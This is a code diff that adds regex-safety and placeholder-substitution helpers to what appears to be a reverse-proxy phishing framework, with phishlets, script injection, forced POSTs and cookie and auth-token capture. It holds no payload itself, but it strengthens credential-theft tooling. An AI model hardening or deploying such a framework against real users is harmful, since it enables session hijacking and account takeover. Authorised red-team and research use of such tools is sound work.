@@ -35,6 +35,39 @@ def _as_list(v, default=()):
     return list(v)
 
 
+def _safe_search(pattern, text):
+    """re.search that treats an invalid pattern as "no match".
+
+    Operator-supplied paths/keys are regexes. A typo like `[unclosed` used to raise
+    mid-request (a 500 and a traceback); a bad pattern is a non-match, which is the
+    same answer Intercept.matches and AuthToken.matches already give.
+    """
+    try:
+        return re.search(pattern, text) is not None
+    except re.error:
+        return False
+
+
+def _subst_params(obj, mapping):
+    """Deep-substitute `{param}` placeholders in a phishlet structure.
+
+    The old child() round-tripped through json.dumps -> str.replace -> json.loads, so a
+    parameter value containing a quote or a backslash corrupted the JSON and raised
+    (a tenant like `a"b` was simply unreachable). Walking the structure substitutes
+    without ever touching JSON syntax.
+    """
+    if isinstance(obj, dict):
+        return {k: _subst_params(v, mapping) for k, v in obj.items()}
+    if isinstance(obj, list):
+        return [_subst_params(v, mapping) for v in obj]
+    if isinstance(obj, str):
+        out = obj
+        for k, v in mapping.items():
+            out = out.replace("{" + str(k) + "}", str(v))
+        return out
+    return obj
+
+
 class ProxyHost:
     """One upstream host that gets mirrored.
 
@@ -201,7 +234,7 @@ class JsInject:
             if not any(d in h for d in self.trigger_domains):
                 return False
         p = path or "/"
-        return not (self.trigger_paths and not any(re.search(rx, p) for rx in self.trigger_paths))
+        return not (self.trigger_paths and not any(_safe_search(rx, p) for rx in self.trigger_paths))
 
     def to_dict(self):
         # the payload itself must round-trip: emitting only its length made
@@ -323,7 +356,7 @@ class ForcePost:
             return False
         for s in self.search:
             key = s.get("key") if isinstance(s, dict) else None
-            if key and not re.search(key, body_text or ""):
+            if key and not _safe_search(key, body_text or ""):
                 return False
         return True
 
@@ -489,10 +522,7 @@ class Phishlet:
         """Create a derived phishlet with {param} placeholders substituted."""
         merged = dict(self.params)
         merged.update(dict(values.items()))
-        blob = json.dumps(self.to_dict())
-        for k, v in merged.items():
-            blob = blob.replace("{" + k + "}", str(v))
-        data = json.loads(blob)
+        data = _subst_params(self.to_dict(), merged)
         data["name"] = name or f"{self.name}-{'-'.join(str(v) for v in values.values())}"
         data["params"] = merged
         return Phishlet.from_dict(data)
@@ -525,9 +555,9 @@ class Phishlet:
         if not self.inject_paths:
             return True
         p = path or "/"
-        if any(re.search(rx, p) for rx in self.block_paths):
+        if any(_safe_search(rx, p) for rx in self.block_paths):
             return False
-        return any(re.search(rx, p) for rx in self.inject_paths)
+        return any(_safe_search(rx, p) for rx in self.inject_paths)
 
     def wants_cookie(self, name):
         if not self.capture_cookies or "*" in self.capture_cookies:
